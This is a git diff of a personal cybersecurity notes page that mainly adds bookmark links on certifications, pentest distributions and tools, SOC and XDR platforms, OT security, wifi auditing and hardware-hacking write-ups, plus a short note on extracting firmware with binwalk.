@@ -2,7 +2,7 @@
 title: Cyber Security
 description: ""
 created: 2022-12-31
-updated: 2024-10-03
+updated: 2025-01-09
 tags:
   - security
 ---
@@ -19,8 +19,8 @@ Cyber attack lifecycle/kill chain
 - persistence (backdoor)
 - profit
 
-[Computer security - Wikiwand](https://omni.wikiwand.com/en/Cyber%20Security)
-[Information security - Wikiwand](https://omni.wikiwand.com/en/Information_security)
+[Computer security - Wikiwand](https://www.wikiwand.com/en/Cyber%20Security)
+[Information security - Wikiwand](https://www.wikiwand.com/en/Information_security)
 
 [How do hackers get caught? - the hunt for the hacker. - YouTube](https://www.youtube.com/watch?v%3Dw0h1Fshu74g)
 [I wouldn’t give this cable to my worst enemy - O.MG Cable - YouTube](https://www.youtube.com/watch?v=mPF9f-PLDPc)
@@ -30,7 +30,6 @@ Cyber security targets online threats while information security takes a holisti
 
 [carpedm20/awesome-hacking: A curated list of awesome Hacking tutorials, tools and resources](https://github.com/carpedm20/awesome-hacking)
 [onlurking/awesome-infosec: A curated list of awesome infosec courses and training resources.](https://github.com/onlurking/awesome-infosec)
-[Tib3rius/Pentest-Cheatsheets](https://github.com/Tib3rius/Pentest-Cheatsheets/tree/master)
 
 [DEFCONConference - YouTube](https://www.youtube.com/@DEFCONConference)
 
@@ -39,11 +38,17 @@ NetworkChuck
 [Hacker Skills // OSINT (Information Gathering) - YouTube](https://www.youtube.com/playlist?list=PLIhvC56v63IJ9SYBtdDsNnORfTNFCXR8_)
 [Learn Ethical Hacking (CEH Journey) - YouTube](https://www.youtube.com/playlist?list=PLIhvC56v63IIJZRa3lzK6IeBQOH_VFjUQ)
 
+[Project Zero](https://googleprojectzero.blogspot.com/)
 [Black Hat | Home](https://www.blackhat.com/)
 [The Daily Swig | Cybersecurity news and views](https://portswigger.net/daily-swig)
 [WhiteHat Security Blog](https://blog.whitehatsec.com/)
 [Blog - Security Research | Akamai](https://www.akamai.com/blog/security-research)
 [Hacking Articles - Raj Chandel's Blog](https://www.hackingarticles.in/)
+[InfoSec Write-ups](https://infosecwriteups.com/)
+[Jorge Lajara Website](https://jlajara.gitlab.io/)
+[Yealvare – Medium](https://medium.com/@yealvare)
+[Dark Reading | Security | Protect The Business](https://www.darkreading.com/)
+[ASecuritySite: When Bob Met Alice – Medium](https://medium.com/asecuritysite-when-bob-met-alice)
 
 [hak5](http://hak5.org/)
 [Official PCI Security Standards Council Site - Verify PCI Compliance, Download Data Security and Credit Card Security Standards](https://www.pcisecuritystandards.org/)
@@ -57,6 +62,8 @@ NetworkChuck
 [Topics - Activity - 0x00pf - 0x00sec - The Home of the Hacker](https://0x00sec.org/u/0x00pf/activity/topics)
 [Topics - Activity - Danus - 0x00sec - The Home of the Hacker](https://0x00sec.org/u/danus/activity/topics)
 
+[Aif4thah/Dojo-101: Cybersecurity Knowledge Base](https://github.com/Aif4thah/Dojo-101)
+
 [Cybersecurity and Its Ten Domains - University System of Georgia | Coursera](https://www.coursera.org/learn/cyber-security-domain)
 [Altered Security: Hands-On Enterprise Security and Red Team Labs](https://www.alteredsecurity.com/) Windows attacks
 [Welcome to the Red Canary 2023 Threat Detection Report](https://redcanary.com/threat-detection-report/) Windows attacks
@@ -67,6 +74,7 @@ NetworkChuck
 
 [Identity eats security: How identity management is driving security | CSO Online](https://www.csoonline.com/article/3289146/authentication/identity-eats-security-how-identity-management-is-driving-security.html) detect intrusion beyond authentication
 
+[5 Common Methods Hackers Use to Break Into Your Bank Account](https://www.makeuseof.com/tag/methods-hackers-bank-account/)
 [10 Ways to Keep a Rogue RasPi From Wrecking Your ...](https://www.darkreading.com/iot/10-ways-to-keep-a-rogue-raspi-from-wrecking-your-network/d/d-id/1335146)
 
 [Palo Alto’s 134-slide presentation reveals the insides of the global cyber market | Ctech](https://www.calcalistech.com/ctechnews/article/ryhbwqga2) market size
@@ -176,19 +184,34 @@ The focus of the last 3 stages is _DETECTION and RESPONSE_.
 [After a Cyber Incident: Guide To CISO Career Protection](https://www.itprotoday.com/regulatory-compliance/guide-to-navigating-the-legal-perils-after-a-cyber-incident)
 [Footprints » Linux Magazine](https://www.linux-magazine.com/index.php/Issues/2024/286/Digital-Forensics-and-Incident-Response)
 
+[After My Data Was Breached, Here's How I Protected My Accounts](https://www.makeuseof.com/how-protect-accounts-after-data-breach/)
+
 ## Learning/Courses/Videos
 
+[Free Courses That Are Actually Free: Cybersecurity Edition - KDnuggets](https://www.kdnuggets.com/free-courses-that-are-actually-free-cybersecurity-edition)
 [Which Platform Is Better: TryHackMe or Hack The Box? - YouTube](https://www.youtube.com/watch?v=fu10bMuNHKw)
 
+[Yeah Hub - Kali Linux Tutorials | Tech News | SEO Tips and Tricks](https://www.yeahhub.com/home/)
+[yeahhub/Hacking-Security-Ebooks: Top 100 Hacking & Security E-Books (Free Download)](https://github.com/yeahhub/Hacking-Security-Ebooks)
+[yeahhub/Kali-Linux-Ebooks: Top 20 Kali Linux Related E-books (Free Download)](https://github.com/yeahhub/Kali-Linux-Ebooks)
+
 [TryHackMe | Cyber Security Training](https://tryhackme.com/)
+[TryHackMe! Basic Penetration Testing - YouTube](https://www.youtube.com/watch?v=xl2Xx5YOKcI)
 
 [Hack The Box: Hacking Training For The Best | Individuals & Companies](https://www.hackthebox.com/)
 [hack the box - YouTube](https://www.youtube.com/watch?v=4CJMpZfK1rI)
 
+[An Interactive Cyber Security Platform | Defend the Web](https://defendtheweb.net/) originally HackThis!!
+
+[OverTheWire: Wargames](https://overthewire.org/wargames/)
+
 [Yizheng's Homepage](https://surrealyz.github.io/)
+[hacksplaining - Lessons](https://hacksplaining.com/lessons)
 
 [HackTricks](https://book.hacktricks.xyz/welcome/readme) ❗!important
 [Hack Smarter](https://hacksmarter.org/)
+[Hack This Site](https://www.hackthissite.org/pages/index/index.php)
+[ThisisLegal.com - Are You?](https://thisislegal.com/)
 
 [Red Team Development and Operations | Red Team Development and Operations](https://redteam.guide/)
 
@@ -198,6 +221,7 @@ The focus of the last 3 stages is _DETECTION and RESPONSE_.
 [Douglas Crockford: Principles of Security - YouTube](https://www.youtube.com/watch?v=zKuFu19LgZA)
 [The Lazy Programmer's Guide to Secure Computing - YouTube](https://www.youtube.com/watch?v=eL5o4PFuxTY)
 [An Overview of the Security Ecosystem in Programming - via @codeship | via @codeship](https://blog.codeship.com/an-overview-of-the-security-ecosystem-in-program/)
+[Transitioning Into a Penetration Testing Role | Schellman](https://www.schellman.com/blog/careers/transitioning-penetration-testing-role)
 
 [3 FREE Resources for Cyber Defenders - YouTube](https://www.youtube.com/watch?v=bR6s1UJ4aAs)
 [The DFIR Report - Real Intrusions by Real Attackers, The Truth Behind the Intrusion](https://thedfirreport.com/) real world attack reports
@@ -213,12 +237,14 @@ The focus of the last 3 stages is _DETECTION and RESPONSE_.
 [InsiderPhD - YouTube](https://www.youtube.com/@InsiderPhD)
 [IppSec - YouTube](https://www.youtube.com/@ippsec) HackTheBox
 [John Hammond - YouTube](https://www.youtube.com/@_JohnHammond) [JohnHammond - GitHub](https://github.com/JohnHammond)
+[HackerOne - YouTube](https://www.youtube.com/@HackerOneTV)
 [MalwareTech - Everything Cyber Security](https://www.malwaretech.com/) the guy who disabled WannaCry
 [Marcus Hutchins - YouTube](https://www.youtube.com/@MalwareTechBlog)
 [mitrecorp - YouTube](https://www.youtube.com/@mitrecorp)
 [NetworkChuck - YouTube](https://www.youtube.com/@NetworkChuck)
 [The CISO Perspective - YouTube](https://www.youtube.com/@TheCISOPerspective)
 [Tyler Ramsbey || Hack Smarter - YouTube](https://www.youtube.com/@TylerRamsbey)
+[webpwnized - YouTube](https://www.youtube.com/user/webpwnized)
 [x33fcon - YouTube](https://www.youtube.com/@x33fcon)
 
 [Jack Rhysider - YouTube](https://www.youtube.com/@JackRhysider/) hacker story
@@ -243,6 +269,92 @@ The focus of the last 3 stages is _DETECTION and RESPONSE_.
 
 [qwqdanchun](https://github.com/qwqdanchun) RED team, releasing attack tools
 [恶意软件学习笔记 - Malware Note](https://docs.qwqdanchun.com/)
+
+## Certifications
+
+> Comptia Sec+, Cysa+, CASP are all respectful certifications but Pentest+ ... won't teach you how to pen test.
+
+[Cyber Security Certificate Tier List - YouTube](https://www.youtube.com/watch?v=VBH5fEsfs18)
+
+[Course Specific Resources for Offsec Students – OffSec Support Portal](https://help.offsec.com/hc/en-us/categories/6965809783316-Course-Specific-Resources-for-Offsec-Students)
+
+[Cybersecurity Certifications | Information Security Certifications | ISC2](https://www.isc2.org/certifications)
+
+[10 Popular Cybersecurity Certifications [2025 Updated] | Coursera](https://www.coursera.org/articles/popular-cybersecurity-certifications)
+[Your Ultimate Guide to Cybersecurity Certifications](https://cybersecurityguide.org/programs/cybersecurity-certifications/)
+[What Is OSCP Certification and Is it Worth It? 2025 Guide | Coursera](https://www.coursera.org/articles/oscp)
+
+[Google Cybersecurity Certificate - Grow with Google](https://grow.google/certificates/cybersecurity/)
+[Google Cybersecurity Professional Certificate | Coursera](https://www.coursera.org/google-certificates/cybersecurity-certificate)
+
+### Offensive Security Web Expert (OSWE)
+
+[OSWE Exam FAQ – OffSec Support Portal](https://help.offsec.com/hc/en-us/articles/360046418812-OSWE-Exam-FAQ)
+
+[WEB-300: Advanced Web Application Security Certification | OffSec](https://www.offsec.com/courses/web-300/)
+[WEB-300: Advanced Web Attacks and Exploitation OSWE Exam Guide – OffSec Support Portal](https://help.offsec.com/hc/en-us/articles/360046869951-WEB-300-Advanced-Web-Attacks-and-Exploitation-OSWE-Exam-Guide)
+
+[The OSWE Review and Exam Preparation Guide | Schellman](https://www.schellman.com/blog/cybersecurity/oswe-review-and-exam-guide)
+[OSWE Review - Tips & Tricks (Offensive Security Web Expert) - YouTube](https://www.youtube.com/watch?v=ElZ7fFE9Gr4)
+
+### Foundational Web Application Assessments with Kali Linux (OSWA)
+
+[WEB-200: Foundational Web Application Assessments with Kali Linux (OSWA) Exam Guide – OffSec Support Portal](https://help.offsec.com/hc/en-us/articles/4410105650964-WEB-200-Foundational-Web-Application-Assessments-with-Kali-Linux-OSWA-Exam-Guide)
+[OSWA Exam FAQ – OffSec Support Portal](https://help.offsec.com/hc/en-us/articles/7281947451284-OSWA-Exam-FAQ)
+
+[WEB-200: Foundational Web Application Assessments with Kali Linux | OffSec](https://www.offsec.com/courses/web-200/)
+[Web Attacks with Kali Linux (WEB-200) – OffSec Support Portal](https://help.offsec.com/hc/en-us/sections/6971423729044-Web-Attacks-with-Kali-Linux-WEB-200)
+
+### OffSec Certified Professional (OSCP)
+
+> hard
+
+[What Is OSCP Certification and Is it Worth It? 2025 Guide | Coursera](https://www.coursera.org/articles/oscp)
+
+[PEN-200: Penetration Testing Certification with Kali Linux | OffSec](https://www.offsec.com/courses/pen-200/)
+[Penetration Testing with Kali Linux (PEN-200) – OffSec Support Portal](https://help.offsec.com/hc/en-us/sections/6970444968596-Penetration-Testing-with-Kali-Linux-PEN-200)
+
+### OffSec Advanced Evasion Techniques and Breaching Defenses (OSEP)
+
+[OSEP Exam Guide – OffSec Support Portal](https://help.offsec.com/hc/en-us/articles/360050293792-OSEP-Exam-Guide)
+[OSEP Exam FAQ – OffSec Support Portal](https://help.offsec.com/hc/en-us/articles/360049781352-OSEP-Exam-FAQ)
+
+[PEN-300: Advanced Penetration Testing Certification | OffSec](https://www.offsec.com/courses/pen-300/)
+[Evasion Techniques and Breaching Defenses (PEN-300) – OffSec Support Portal](https://help.offsec.com/hc/en-us/sections/6971304660372-Evasion-Techniques-and-Breaching-Defenses-PEN-300)
+
+[OSEP PEN-300 Course Review | Schellman](https://www.schellman.com/blog/cybersecurity/osep-and-pen-300-course-review)
+
+### OffSec Foundational Wireless Network Attacks (OSWP)
+
+[OSWP Exam Guide – OffSec Support Portal](https://help.offsec.com/hc/en-us/articles/360046904731-OSWP-Exam-Guide)
+[OSWP Exam FAQ – OffSec Support Portal](https://help.offsec.com/hc/en-us/articles/360046904551-OSWP-Exam-FAQ)
+
+[(PEN-210) Foundational Wireless Network Attacks FAQ – OffSec Support Portal](https://help.offsec.com/hc/en-us/articles/360046454712--PEN-210-Foundational-Wireless-Network-Attacks-FAQ)
+
+### Certified Information Systems Security Professional (CISSP)
+
+[CISSP - Certified Information Systems Security Professional | ISC2](https://www.isc2.org/certifications/cissp)
+
+[Get CISSP Certified: A Self-Study Guide to Success | Schellman](https://www.schellman.com/blog/cybersecurity/get-cissp-certified-a-self-study-guide-to-success)
+
+### CompTIA Security+
+
+https://www.comptia.org/certifications/security
+[Attention Required! | Cloudflare](https://www.comptia.org/certifications/security)
+
+### Certified Ethical Hacker (CEH)
+
+> some comments EC Council is trash
+
+[CEH Certification | Ethical Hacking Training & Course | EC-Council](https://www.eccouncil.org/train-certify/certified-ethical-hacker-ceh/)
+[Certified Ethical Hacker Online Training | CEH Training](https://iclass.eccouncil.org/our-courses/certified-ethical-hacker-ceh/)
+
+### Burp Suite Certified Practitioner
+
+[Burp Suite Certified Practitioner | Web Security Academy - PortSwigger](https://portswigger.net/web-security/certification)
+[How the Burp Suite Certified Practitioner exam process works | Web Security Academy - PortSwigger](https://portswigger.net/web-security/certification/how-it-works)
+
+[The Burp Suite Certified Practitioner Exam: A Review | Schellman](https://www.schellman.com/blog/cybersecurity/burp-suite-practitioner-exam-review)
 
 ## CTF/Labs
 
@@ -303,6 +415,9 @@ Google CTF
 
 [No, Your Antivirus Doesn't Need to Be Open Source—Here's Why](https://www.makeuseof.com/no-your-antivirus-doesnt-need-to-be-open-sourceheres-why/)
 
+[Security Onion Solutions](https://securityonionsolutions.com/)
+[Security-Onion-Solutions/securityonion: Security Onion is a free and open platform for threat hunting, enterprise security monitoring, and log management. It includes our own interfaces for alerting, dashboards, hunting, PCAP, detections, and case management. It also includes other tools such as osquery, CyberChef, Elasticsearch, Logstash, Kibana, Suricata, and Zeek.](https://github.com/Security-Onion-Solutions/securityonion)
+
 [EQL Analytics Library — EQL Analytics Library documentation](https://eqllib.readthedocs.io/en/latest/index.html)
 
 [OTRF/ThreatHunter-Playbook: A community-driven, open-source project to share detection logic, adversary tradecraft and resources to make detection development more efficient.](https://github.com/OTRF/ThreatHunter-Playbook)
@@ -352,6 +467,10 @@ Server and client (support up to 1.1 of the TAXII standard)
 [Cabby documentation](https://cabby.readthedocs.io/en/latest/)
 [eclecticiq/cabby: TAXII client implementation from EclecticIQ](https://github.com/eclecticiq/Cabby)
 
+[Hyperscale ML threat intelligence for early detection & disruption | Microsoft Community Hub](https://techcommunity.microsoft.com/blog/microsoftthreatprotectionblog/hyperscale-ml-threat-intelligence-for-early-detection--disruption/4359763)
+[Simplify your SOC with Rob Lefferts and Allie Mellen](https://ignite.microsoft.com/en-US/sessions/BRK310?source=sessions)
+[[2411.06239] Web Scale Graph Mining for Cyber Threat Intelligence](https://arxiv.org/abs/2411.06239)
+
 ### Endpoint Detection and Response (EDR)
 
 [AURORA Agent - Nextron Systems](https://www.nextron-systems.com/aurora/)
@@ -362,8 +481,7 @@ Server and client (support up to 1.1 of the TAXII standard)
 
 ### Extended Detection and Response (XDR)
 
-[Wazuh · The Open Source Security Platform](https://wazuh.com/)
-[Improve your security posture with Wazuh, a free and open source XDR](https://thehackernews.com/2022/09/improve-your-security-posture-with.html)
+[[#Wazuh]]
 
 ### IDS/IPS
 
@@ -473,10 +591,13 @@ sudo suricata-update   # Do not forget to update rules after activating source
 
 ### Wazuh
 
-[Wazuh - Open Source XDR. Open Source SIEM.](https://wazuh.com/)
-
+[Wazuh · The Open Source Security Platform](https://wazuh.com/)
+[Wazuh documentation](https://documentation.wazuh.com/current/)
 [Wazuh](https://github.com/wazuh) GitHub Org
 [wazuh/wazuh-ruleset: Wazuh - Ruleset](https://github.com/wazuh/wazuh-ruleset)
+
+[Improve your security posture with Wazuh, a free and open source XDR](https://thehackernews.com/2022/09/improve-your-security-posture-with.html)
+[you need this FREE CyberSecurity tool - YouTube](https://www.youtube.com/watch?v=3CaG2GI1kn0)
 
 ## Supply Chain Attack
 
@@ -487,12 +608,43 @@ sudo suricata-update   # Do not forget to update rules after activating source
 
 [npm audit: Broken by Design — Overreacted](https://overreacted.io/npm-audit-broken-by-design/) audit tools should not cause noise
 
+## Social Engineering
+
+[7 Types of Phishing Attacks You Should Know About](https://www.makeuseof.com/types-of-phishing-attacks-you-should-know-about/)
+
+## OT security
+
+[What is Operational Technology (OT) Security? - Cisco](https://www.cisco.com/site/us/en/learn/topics/security/what-is-ot-security.html)
+
+[Securing OT Networks: Strategies and Best Practices | OTORIO](https://www.otorio.com/resources/mastering-security-for-ot-networks/)
+[Best Practices for Operational Technology (OT) Security | OTORIO](https://www.otorio.com/resources/ot-security-best-practices/)
+
+[Products - ISA/IEC-62443-3-3: What is it and how to comply? - Cisco](https://www.cisco.com/c/en/us/products/collateral/security/isaiec-62443-3-3-wp.html)
+[Guide to Operational Technology (OT) Security](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-82r3.pdf) NIST.SP.800
+
 ## Cybersec Tools
 
 [The Tool Box - YouTube](https://www.youtube.com/playlist?list=PLzKIBgD3ky23HMXMZj6zbH9WANSeoy-Ju)
 [19 open source GitHub projects for security pros | InfoWorld](http://www.infoworld.com/article/3051771/security/19-open-source-github-projects-for-security-pros.html)
 
 [penetration testing - freeCodeCamp.org](https://www.freecodecamp.org/news/tag/penetration-testing/)
+[Tib3rius/Pentest-Cheatsheets](https://github.com/Tib3rius/Pentest-Cheatsheets/)
+
+[Conduct a Penetration Test Like a Pro in 6 Phases [Tutorial] - YouTube](https://www.youtube.com/watch?v=8a1yTN2kFNw)
+
+- Pre-engagement
+- Reconnaissance
+- Vulnerability Assessment
+- Exploitation
+- Post Exploitation
+
+[Commando VM: The First of Its Kind Windows Offensive Distribution | Mandiant | Google Cloud Blog](https://cloud.google.com/blog/topics/threat-intelligence/commando-vm-windows-offensive-distribution)
+
+[Soldie/Yuki-Chan-The-Auto-Pentest](https://github.com/Soldie/Yuki-Chan-The-Auto-Pentest)
+
+[Goby— 资产绘测及实战化漏洞扫描工具](https://gobies.org/) asset scan, PoC
+[MY0723/goby-poc: 451个goby poc，是否后门及重复自行判断，来源于网络收集的Goby&POC，不定时更新。](https://github.com/MY0723/goby-poc)
+[D-Haiming/gobypoc: This repository comes from an Internet collection](https://github.com/D-Haiming/gobypoc)
 
 [swisskyrepo/PayloadsAllTheThings: A list of useful payloads and bypass for Web Application Security and Pentest/CTF](https://github.com/swisskyrepo/PayloadsAllTheThings/)
 
@@ -501,6 +653,11 @@ sudo suricata-update   # Do not forget to update rules after activating source
 [The Bro Network Security Monitor](https://www.bro.org/)
 
 [fortra/impacket: Impacket is a collection of Python classes for working with network protocols.](https://github.com/fortra/impacket) ❗!important
+
+[mostaphabahadou/postenum: A lightweight, portable, and modular tool for Linux enumeration and privilege escalation.](https://github.com/mostaphabahadou/postenum)
+
+[hping3 | Kali Linux Tools](https://www.kali.org/tools/hping3/)
+[hping3(8) - Linux man page](https://linux.die.net/man/8/hping3)
 
 [trustedsec/ptf: The Penetration Testers Framework (PTF) is a way for modular support for up-to-date tools.](https://github.com/trustedsec/ptf)
 
@@ -527,8 +684,11 @@ sudo suricata-update   # Do not forget to update rules after activating source
 
 ### Kali Linux
 
+[kali-linux - LinuxServer.io](https://docs.linuxserver.io/images/docker-kali-linux/) dockerized Kali accessed via VNC
+
 [Kali Linux | Penetration Testing and Ethical Hacking Linux Distribution](https://www.kali.org/)
 [Kali Tools | Kali Linux Tools](https://www.kali.org/tools/)
+[Introduction to Kali Linux - GeeksforGeeks](https://www.geeksforgeeks.org/introduction-to-kali-linux/)
 
 `kali-tweaks`
 
@@ -542,6 +702,26 @@ sudo suricata-update   # Do not forget to update rules after activating source
 
 [介紹 | 大学霸 Kali Linux 安全渗透教程](https://wizardforcel.gitbooks.io/daxueba-kali-linux-tutorial/content/)
 
+[Official Kali Linux Docker Images | Kali Linux Documentation](https://www.kali.org/docs/containers/official-kalilinux-docker-images/) no services installed
+[artis3n/kali-artis3n: A kalilinux/kali-rolling container with extra juice.](https://github.com/artis3n/kali-artis3n)
+[blairjames/kali-ready-to-roll: The latest kali-rolling with kali-linux-headless and wordlists installed.](https://github.com/blairjames/kali-ready-to-roll)
+
+#### Kali Linux NetHunter
+
+> for Android
+
+[What is Kali NetHunter for Android? | Simplilearn](https://www.simplilearn.com/tutorials/cyber-security-tutorial/what-is-kali-nethunter)
+
+### BlackArch
+
+[BlackArch Linux - Penetration Testing Distribution](https://blackarch.org/index.html)
+[BlackArch/blackarch: An ArchLinux based distribution for penetration testers and security researchers.](https://github.com/BlackArch/blackarch)
+
+### Parrot Security OS
+
+[Parrot Security](https://parrotsec.org/)
+[What is Parrot Security OS? Features & Installation | Simplilearn](https://www.simplilearn.com/tutorials/cyber-security-tutorial/parrot-security-os)
+
 ### Metasploit
 
 [Penetration Testing Software | Metasploit](https://www.metasploit.com/)
@@ -549,13 +729,35 @@ sudo suricata-update   # Do not forget to update rules after activating source
 [How to Hack Like a Pro: Getting Started with Metasploit « Null Byte :: WonderHowTo](https://null-byte.wonderhowto.com/how-to/hack-like-pro-getting-started-with-metasploit-0134442/)
 [Metasploit — A Walkthrough Of The Powerful Exploitation Framework](https://www.freecodecamp.org/news/metasploit-a-walkthrough-of-the-powerful-exploitation-framework/)
 
+[Metasploit For Beginners | What is Metasploit Explained | Metasploit Basics Tutorial | Simplilearn - YouTube](https://www.youtube.com/watch?v=5m4KF9XbkzU&t=627s)
+[Penetration Testing with Metasploit: A Comprehensive Tutorial - YouTube](https://www.youtube.com/watch?v=Keld6Wi8aZ4)
+
+### GOSINT
+
+[ciscocsirt/GOSINT: The GOSINT framework is a project used for collecting, processing, and exporting high quality indicators of compromise (IOCs).](https://github.com/ciscocsirt/GOSINT) 🗃️archived
+[Welcome to GOSINT’s documentation! — gosint 0.0.1 documentation](https://gosint.readthedocs.io/en/latest/)
+
+[GOSINT: A framework for collecting, processing, and exporting IOCs](https://securitytrails.com/blog/gosint-framework)
+
+### Jok3r
+
+[Jok3r v3 - Network & Web Pentest Automation Framework](https://www.jok3r-framework.com/)
+[koutto/jok3r: Jok3r v3 BETA 2 - Network and Web Pentest Automation Framework](https://github.com/koutto/jok3r/)
+
+[Jok3r: A Framework for Automated Network and Web Penetration Testing](https://securitytrails.com/blog/jok3r-framework)
+
 ### Vulnerability scanner
 
+[13 Online Vulnerability Scanning Tools to Scan your Website Security](https://securitytrails.com/blog/online-vulnerability-scanning-tools)
 [Vulnerability Scans and False Positives](https://www.itgovernance.co.uk/blog/vulnerability-scans-false-positives-the-importance-of-sanitising-input)
 
 [OpenVAS - Open Vulnerability Assessment Scanner](https://openvas.org/)
 [Greenbone Community Documentation](https://greenbone.github.io/docs/latest/)
 [greenbone/openvas-scanner: This repository contains the scanner component for Greenbone Community Edition.](https://github.com/greenbone/openvas-scanner)
+
+[Install Nessus for Free and scan for Vulnerabilities (New Way) - YouTube](https://www.youtube.com/watch?v=Gy-aPBb0djk) Nessus Essentials
+[Best FREE Vulnerability Scanner: Nessus Vs OpenVAS (Greenbone) - YouTube](https://www.youtube.com/watch?v=sEzN2U4Pqcs)
+[Tenable Nessus Essentials Vulnerability Scanner | Tenable®](https://www.tenable.com/products/nessus/nessus-essentials)
 
 [Attack Tool Kit / Introduction](https://www.computec.ch/projekte/atk/)
 [411Hall/JAWS: JAWS - Just Another Windows (Enum) Script](https://github.com/411Hall/JAWS)
@@ -571,8 +773,6 @@ sudo suricata-update   # Do not forget to update rules after activating source
 [anchore/yardstick: Compare vulnerability scanners results (to make them better!)](https://github.com/anchore/yardstick)
 
 [SCARLETEEL: Operation leveraging Terraform, Kubernetes, and AWS for data theft – Sysdig](https://sysdig.com/blog/cloud-breach-terraform-data-theft/)
-
-[chaitin/xray: 一款完善的安全评估工具，支持常见 web 安全问题扫描和自定义 poc | 使用之前务必先阅读文档](https://github.com/chaitin/xray)
 
 ### Honeypot
 
@@ -610,6 +810,8 @@ sudo suricata-update   # Do not forget to update rules after activating source
 [kung-foo/freki: Freki is a tool to manipulate packets in usermode using NFQUEUE and golang.](https://github.com/kung-foo/freki)
 
 ## Reconnaissance
+
+[[shell-network#nmap]]
 
 [Real World Hacking Tools Tutorial (Target: Tesla) - YouTube](https://www.youtube.com/watch?v=-jLbRnmGYaA)
 Open Source Intelligence (OSINT)
@@ -761,6 +963,7 @@ Hashcat: dictionary attack
 ## Zero Trust Network
 
 [[vpn#Tailscale]]
+[[vpn#Twingate]]
 
 IP address, network id
 Workload id, service id
@@ -804,7 +1007,22 @@ Workload id, service id
 [SPIFFE in a Nutshell - Pushpalanka Jayawardhana - Medium](https://medium.com/@Pushpalanka/spiffe-in-a-nutshell-20b4ab150420)
 [Sunil James, CEO of Scytale, Explains SPIFFE - The New Stack](https://thenewstack.io/sunil-james-ceo-of-scytale-explains-spiffe/)
 
----
+# Wireless
+
+## Wifi
+
+[3 Levels of WiFi Hacking - YouTube](https://www.youtube.com/watch?v=dZwbb42pdtg) NetworkChuck
+
+[Aircrack-ng](https://www.aircrack-ng.org/)
+[aircrack-ng/aircrack-ng: WiFi security auditing tools suite](https://github.com/aircrack-ng/aircrack-ng)
+
+[Wifiphisher - The Rogue Access Point Framework](https://wifiphisher.org/)
+[wifiphisher/wifiphisher: The Rogue Access Point Framework](https://github.com/wifiphisher/wifiphisher)
+
+## Air Gap attacks
+
+[Home | Air Gap Research Page](https://www.covertchannels.com/)
+[new attack leaks secrets using RAM as a radio - YouTube](https://www.youtube.com/watch?v=ihtAijebU-M)
 
 # Cybersec Hardwares
 
@@ -814,9 +1032,15 @@ Workload id, service id
 [Breaking into an Embedded Linux System eBook](https://view.highspot.com/viewer/6508748d74ebacd3d74dc5cc) QEMU setup
 
 [Make Me Hack - YouTube](https://www.youtube.com/@MakeMeHack) QEMU and hardware hacking
+[Matt Brown - YouTube](https://www.youtube.com/@mattbrwn) IoT hacking
 
 [How We Hacked a TP-Link Router and Took Home $55,000 in Pwn2Own - YouTube](https://www.youtube.com/watch?v=zjafMP7EgEA)
 [Hacker's Guide to UART Root Shells - YouTube](https://www.youtube.com/watch?v=01mw0oTHwxg)
+[US Government to BanTP-Link Devices - Live Hacking of a Chinese WiFi Router - YouTube](https://www.youtube.com/watch?v=clESYc9BDvc)
+
+[this can't be real. - YouTube](https://www.youtube.com/watch?v=sEqvlCrbikQ) bug in MediaTek SDK
+[4 exploits, 1 bug: exploiting CVE-2024-20017 4 different ways | hyprblog](https://blog.coffinsec.com/0day/2024/08/30/exploiting-CVE-2024-20017-four-different-ways.html)
+[Critical Exploit in MediaTek Wi-Fi Chipsets: Zero-Click Vulnerability (CVE-2024-20017) Threatens Routers and Smartphones | SonicWall](https://blog.sonicwall.com/en-us/2024/09/critical-exploit-in-mediatek-wi-fi-chipsets-zero-click-vulnerability-cve-2024-20017-threatens-routers-and-smartphones/)
 
 [Hacking an AT&T 4G Router For Fun and User Freedom - YouTube](https://www.youtube.com/watch?v=I1w_HQ7soSE) using uboot CLI, dump config partition
 
@@ -825,6 +1049,10 @@ Workload id, service id
 [Introduction to Firmware Reversing - YouTube](https://www.youtube.com/watch?v=GIU4yJn2-2A)
 [Intro to Hardware Reversing: Finding a UART and getting a shell - YouTube](https://www.youtube.com/watch?v=ZmZuKA-Rst0)
 [this is my favorite hardware hacking tool - YouTube](https://www.youtube.com/watch?v=X-Lzq7jAT8I) firmware dump
+
+1. Download firmware image
+2. `binwalk -Me ${image}`
+3. Look for `jffs2` (extract with `jefferson`) or `squashfs`
 
 ## Flipper Zero
 
@@ -865,9 +1093,9 @@ David Bombal
 
 ## Rubber Ducky
 
-> ATMega32U4 can be used as an HID device
+> ATMega32U4 can be used as an USB HID device
 
-[BadUSB - Wikiwand](https://omni.wikiwand.com/en/BadUSB)
+[BadUSB - Wikiwand](https://www.wikiwand.com/en/BadUSB)
 [Hak5 - USB Rubber Ducky - YouTube](https://www.youtube.com/playlist?list=PLW5y1tjAOzI0YaJslcjcI4zKI366tMBYk)
 
 [Do NOT Plug This USB In! – Hak5 Rubber Ducky - YouTube](https://www.youtube.com/watch?v=kfaHJwcG2mg)
@@ -940,6 +1168,7 @@ Low Level Learning
 [Why the Traditional Security Operations Model Fails and How To Fix It](https://www.itprotoday.com/vulnerabilities-threats/why-the-traditional-security-operations-model-fails-and-how-to-fix-it)
 [Open-Source Malware vs. Vulnerable Components: Knowing the Difference Matters](https://www.itprotoday.com/vulnerabilities-threats/open-source-malware-vs-vulnerable-components-knowing-the-difference-matters)
 [Linux Malware: What To Know About the Malware Threat](https://www.itprotoday.com/linux-os/linux-malware-what-to-know-about-the-malware-threat)
+[Linux Kernel Exploits: Common Threats and How To Prevent Them](https://www.itprotoday.com/vulnerabilities-threats/linux-kernel-exploits-how-attackers-gain-root-access-and-how-to-defend-against-it)
 
 ## Vulnerability Database
 
@@ -949,24 +1178,99 @@ Low Level Learning
 [Home | CVE](https://www.cve.org/)
 [NVD - Home](https://nvd.nist.gov/)
 
+[OWASP Top Ten | OWASP Foundation](https://owasp.org/www-project-top-ten/)
+[OWASP Top 10](https://hacksplaining.com/owasp)
+
 [车联网产品安全漏洞专业库](https://cavd.org.cn/#/indexHome) CSVD
 
 [Google Hacking Database (GHDB) - Google Dorks, OSINT, Recon](https://www.exploit-db.com/google-hacking-database)
 
 [Exploit Database - Exploits for Penetration Testers, Researchers, and Ethical Hackers](https://www.exploit-db.com/)
 [Exploit-DB / Exploits + Shellcode + GHDB · GitLab](https://gitlab.com/exploit-database/exploitdb)
+[Exploit Database SearchSploit Manual](https://www.exploit-db.com/searchsploit)
+
+[jfoote/exploitable: The 'exploitable' GDB plugin](https://github.com/jfoote/exploitable)
 
 ## Vulnerable Environments/靶機
+
